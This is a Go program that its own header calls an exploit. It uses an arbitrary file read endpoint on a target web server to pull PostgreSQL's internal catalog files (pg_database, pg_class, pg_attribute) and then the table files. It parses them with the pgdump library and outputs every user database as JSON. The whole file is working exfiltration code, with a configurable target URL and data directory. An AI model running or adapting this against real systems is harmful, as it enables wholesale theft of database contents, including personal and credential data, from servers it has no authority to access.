// Exploit demonstrating PostgreSQL data exfiltration via arbitrary file read
// Uses the pgdump library to parse PostgreSQL files fetched over HTTP
package main

import (
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"net/http"
	"os"
	"path/filepath"
	"strings"

	"github.com/Chocapikk/pgread/pgdump"
)

func main() {
	var (
		targetURL string
		pgDataDir string
		dbFilter  string
	)

	flag.StringVar(&targetURL, "url", "http://localhost:8080/read?path=", "Vulnerable endpoint URL (path param will be appended)")
	flag.StringVar(&pgDataDir, "pgdata", "/var/lib/postgresql/data", "PostgreSQL data directory on target")
	flag.StringVar(&dbFilter, "db", "", "Filter by database name")
	flag.Parse()

	fmt.Fprintf(os.Stderr, "[*] Target: %s\n", targetURL)
	fmt.Fprintf(os.Stderr, "[*] PostgreSQL data dir: %s\n", pgDataDir)

	// Create HTTP file reader
	httpReader := func(path string) ([]byte, error) {
		url := targetURL + path
		resp, err := http.Get(url)
		if err != nil {
			return nil, err
		}
		defer resp.Body.Close()

		if resp.StatusCode != 200 {
			return nil, fmt.Errorf("HTTP %d for %s", resp.StatusCode, path)
		}
		return io.ReadAll(resp.Body)
	}

	// Step 1: Read pg_database to list databases
	fmt.Fprintf(os.Stderr, "[*] Reading pg_database...\n")
	pgDatabasePath := filepath.Join(pgDataDir, "global", "1262")
	pgDatabaseData, err := httpReader(pgDatabasePath)
	if err != nil {
		fmt.Fprintf(os.Stderr, "[-] Failed to read pg_database: %v\n", err)
		os.Exit(1)
	}

	databases := pgdump.ParsePGDatabase(pgDatabaseData)
	fmt.Fprintf(os.Stderr, "[+] Found %d databases\n", len(databases))

	var results []pgdump.DatabaseDump

	for _, db := range databases {
		// Skip template databases
		if strings.HasPrefix(db.Name, "template") {
			continue
		}
		// Apply filter if set
		if dbFilter != "" && db.Name != dbFilter {
			continue
		}

		fmt.Fprintf(os.Stderr, "[*] Processing database: %s (OID %d)\n", db.Name, db.OID)

		baseDir := filepath.Join(pgDataDir, "base", fmt.Sprintf("%d", db.OID))

		// Step 2: Read pg_class to list tables
		pgClassPath := filepath.Join(baseDir, "1259")
		pgClassData, err := httpReader(pgClassPath)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to read pg_class for %s: %v\n", db.Name, err)
			continue
		}

		// Step 3: Read pg_attribute to get column info
		pgAttrPath := filepath.Join(baseDir, "1249")
		pgAttrData, err := httpReader(pgAttrPath)
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to read pg_attribute for %s: %v\n", db.Name, err)
			continue
		}

		// Create reader function for table data
		tableReader := func(filenode uint32) ([]byte, error) {
			tablePath := filepath.Join(baseDir, fmt.Sprintf("%d", filenode))
			return httpReader(tablePath)
		}

		// Step 4: Dump the database using pgdump library
		dbDump, err := pgdump.DumpDatabaseFromFiles(pgClassData, pgAttrData, tableReader, &pgdump.Options{
			SkipSystemTables: true,
		})
		if err != nil {
			fmt.Fprintf(os.Stderr, "[-] Failed to dump %s: %v\n", db.Name, err)
			continue
		}

		// Set database info
		dbDump.OID = db.OID
		dbDump.Name = db.Name

		results = append(results, *dbDump)
		fmt.Fprintf(os.Stderr, "[+] Dumped %d tables from %s\n", len(dbDump.Tables), db.Name)
	}

	// Output JSON result
	output := struct {
		Databases []pgdump.DatabaseDump `json:"databases"`
	}{Databases: results}

	enc := json.NewEncoder(os.Stdout)
	enc.SetIndent("", "  ")
	enc.Encode(output)
}
